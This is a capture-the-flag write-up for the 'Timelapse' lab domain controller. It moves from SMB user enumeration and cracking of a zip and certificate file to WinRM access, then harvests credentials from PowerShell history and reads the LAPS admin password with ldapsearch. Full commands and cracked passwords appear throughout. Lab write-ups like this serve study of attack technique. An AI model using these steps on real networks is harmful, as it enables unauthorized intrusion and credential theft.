Started with a nmap scan
```
53 DNS
88 Kerberos
135 RPC
139
389
445
464
593
636 LDAP ssl
3268 LDAP
```
There is a domain `timelapse.htb` and a hostname `dc01.timelapse.htb` checking out the SMB we have guest account access we can do a ridbrute and get a list of users on the host machine
```
Administrator
Guest
krbtgt
DC01$
thecybergeek
payl0ad
legacyy
sinfulz
babywyrm
DB01$
WEB01$
DEV01$
svc_deploy
```
Going back to the SMB there is a `Shares` share with HelpDesk info and a Dev section with a `winrm_backup.zip` the zip file is password protected so we can use `zip2john` to get the hash so we can crack it and then we can use hashcat after making it in the right format and it cracked to `supremelegacy` and we get a `legacyy_dev_auth.pfx` file now we can use `pfx2john` since we don't know the password for the file and then use john to crack it `legacyy_dev_auth.pfx:thuglegacy` we need to get the public and private key from the pfx file so we can auth with it 
```
Public
certipy-ad cert -pfx legacyy_dev_auth.pfx -nokey -out (filename) -password thuglegacy
Private
certipy-ad cert -pfx legacyy_dev_auth.pfx -nocert -out (filename) -password thuglegacy
```
now we can auth using winrm `evil-winrm -i 10.10.11.152 -c legacypub.pem -k legacyprivate.pem -S` now we are on the host we can get the user flag but AV is running so we cant use winpeas or I could not get metasploit payload on there as well so looking around at possible history files we found something in the powershell history file `cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` and we go the creds for another user `svc_deploy:E3R$QQ62^12p7PLlC%KWaxuaV` but we cant winrm as this user so we need to do enumeration from powershell with the `net user svc_deploy` command  and this user is apart of the `LAPS_Readers` group and we can use ldapsearch to read the `ms-Mcs-AdmPwd` `ldapsearch -x -H ldap://10.10.11.152 -D "svc_deploy" -w 'E3R$QQ62^12p7PLlC%KWaxuaV' -b "dc=timelapse,dc=htb" "(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))" ms-Mcs-AdmPwd` and we got the admin password `l@l67x+R6sz!9)E7@2L)v{(R` and now we can winrm into the admin account don't forget the `-S` flag 